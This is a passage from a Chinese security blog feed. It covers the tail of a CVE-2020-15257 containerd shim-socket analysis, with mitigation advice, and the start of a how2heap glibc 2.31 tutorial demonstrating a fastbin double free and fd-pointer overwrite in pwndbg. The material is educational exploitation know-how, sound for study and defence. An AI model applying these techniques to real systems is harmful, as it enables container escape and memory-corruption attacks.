class="keyword">rpc</span> Update(UpdateTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Wait(WaitRequest) <span class="keyword">returns</span> (WaitResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些接口，从名字基本可以猜测与容器管理说有关系的， 比如     <code>Create</code> 、<code>Start</code> 、<code>Delete</code></p><p>通过查看代码    </p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80">https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireSameUser resolves the current effective unix user and returns aStephen J Day, 3 years ago: • vendor: update ttrpc to pull in euid change</span></span><br><span class="line"><span class="comment">// UnixCredentialsFunc that will validate incoming unix connections against the</span></span><br><span class="line"><span class="comment">// current credentials.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This is useful when using abstract sockets that are accessible by all users.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line"><span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireRoot</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> requireUidGid(ucred, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUnixSocket</span><span class="params">(conn net.Conn)</span> <span class="params">(*net.UnixConn, error)</span></span> &#123;</span><br><span class="line">uc, ok := conn.(*net.UnixConn)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;a unix socket connection is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> uc, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnixSocketRequireSameUser </code> 仅仅检查了访问进程的 euid 和 egid ，而在默认情况下容器内部的进程都是以 root 用户启动，所以这个限制可以忽略不计。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用需要构建 <strong>gRPC</strong> ，我们可以通过查阅代码， 查看 <strong>ontainerd</strong> 项目呢关于 <strong>shim-client</strong> 是如何编写的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WithConnect connects to an existing shim</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithConnect</span><span class="params">(address <span class="keyword">string</span>, onClose <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(shimapi.ShimService, io.Closer, error)</span></span> &#123;</span><br><span class="line">conn, err := connect(address, anonDialer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))</span><br><span class="line"><span class="keyword">return</span> shimapi.NewShimClient(client), conn, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 ttrpc 构建 client，此时 conn 为 unix 套字节</p><p>然后返回 client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">c, clo, err :&#x3D; WithConnect(address, func() &#123;&#125;)(ctx, config)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, nil, errors.Wrap(err, &quot;failed to connect&quot;)</span><br><span class="line">&#125;</span><br><span class="line">return c, clo, nil</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ShimRemote is a ShimOpt for connecting and starting a remote shim</span><br><span class="line">func ShimRemote(c *Config, daemonAddress, cgroup string, exitHandler func()) ShimOpt &#123;</span><br><span class="line">return func(b *bundle, ns string, ropts *runctypes.RuncOptions) (shim.Config, client.Opt) &#123;</span><br><span class="line">config :&#x3D; b.shimConfig(ns, c, ropts)</span><br><span class="line">return config,</span><br><span class="line">client.WithStart(c.Shim, b.shimAddress(ns, daemonAddress), daemonAddress, cgroup, c.ShimDebug, exitHandler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Runtime)</span> <span class="title">Create</span><span class="params">(ctx context.Context, id <span class="keyword">string</span>, opts runtime.CreateOpts)</span> <span class="params">(_ runtime.Task, err error)</span></span> &#123;</span><br><span class="line">namespace, err := namespaces.NamespaceRequired(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := identifiers.Validate(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;invalid task id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ropts, err := r.getRuncOptions(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bundle, err := newBundle(id,</span><br><span class="line">filepath.Join(r.state, namespace),</span><br><span class="line">filepath.Join(r.root, namespace),</span><br><span class="line">opts.Spec.Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">bundle.Delete()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">shimopt := ShimLocal(r.config, r.events)</span><br><span class="line"><span class="keyword">if</span> !r.config.NoShim &#123;</span><br><span class="line"><span class="keyword">var</span> cgroup <span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> opts.TaskOptions != <span class="literal">nil</span> &#123;</span><br><span class="line">v, err := typeurl.UnmarshalAny(opts.TaskOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroup = v.(*runctypes.CreateOptions).ShimCgroup</span><br><span class="line">&#125;</span><br><span class="line">exitHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.G(ctx).WithField(<span class="string">&quot;id&quot;</span>, id).Info(<span class="string">&quot;shim reaped&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := r.tasks.Get(ctx, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Task was never started or was already successfully deleted</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.G(ctx).WithError(err).WithFields(logrus.Fields&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:        id,</span><br><span class="line"><span class="string">&quot;namespace&quot;</span>: namespace,</span><br><span class="line">&#125;).Warn(<span class="string">&quot;failed to clean up after killed shim&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如这样的操作</p><p>更多的交互操作可以参考 张一白的 <a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go">PoC</a></p><p>至于具体的利用，在这里就不进行细节探讨了，可以由读者自行完成。最后放一个我的利用视频</p><iframe src="//player.bilibili.com/player.html?aid=800507748&bvid=BV1my4y1q7oe&cid=262892226&page=1&high_quality=1&danmaku=0"allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe<p>另外欢迎大家关注我的推特： <a href="https://twitter.com/bestswngs/status/1334867563914915840">https://twitter.com/bestswngs/status/1334867563914915840</a></p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol><li><p>升级 containerd 至最新版本。</p></li><li><p>通过添加如 deny unix addr=@**的AppArmor策略禁止访问抽象套接字。</p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.chainnews.com/articles/937146786717.htm">https://www.chainnews.com/articles/937146786717.htm</a><br><a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4">https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-15257" scheme="https://bestwing.me/tags/CVE-2020-15257/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html"/>
    <id>https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html</id>
    <published>2020-11-09T16:00:00.000Z</published>
    <updated>2020-11-12T09:07:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>前几天 how2heap 更新了，将主仓库划分成了 2.23 、2.27 以及 2.31 三个分类，这里我们来复习（学习） 一下 glibc 2.31 下的一些 heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>关于 fastbin attack 在glibc 2.31 上没有什么变化, 这里给的样例是通过 double-attack 漏洞修改 构造两个指针指向同一个 chunk 的情景。</p><p>程序首先 malloc 了 8 次, 然后 free 了7次（用来填充 tcache bins）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcachebins 已经填满</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后用 calloc 分配 3 个chunk ， 使用 calloc 分配的时候，此时不会从 tcachebins 拿已经 free 的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">► <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时我们注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 —▸ 0x555555559340 —▸ 0x555555559320 —▸ 0x555555559300 —▸ 0x5555555592e0 —▸ 0x5555555592c0 —▸ 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 —▸ 0x5555555593b0 ◂— 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>此时存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a 指向 chunk b ，同时 chunk b 也指向了 chunk a</p><p>然后如果我们再把他们占回来，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> ► <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe230</span> ◂— <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe240</span> —▸ <span class="number">0x5555555593c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe250</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe258</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe268</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— ...</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>就会存在两个指针指向同一块 chunk，通常而言我们的下一步利用会找一个 size 符合当前fastbin 链的地址（_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。），然后在分配出 chunk a 的同时修改 chunk a 的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax r8  <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x5555555593b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555559390</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## 修改 fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## 设置size 符合 fastbin链</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5555555593e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x5555555593f8</span> ◂— <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>此时fastbin 链的结构就会被修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span 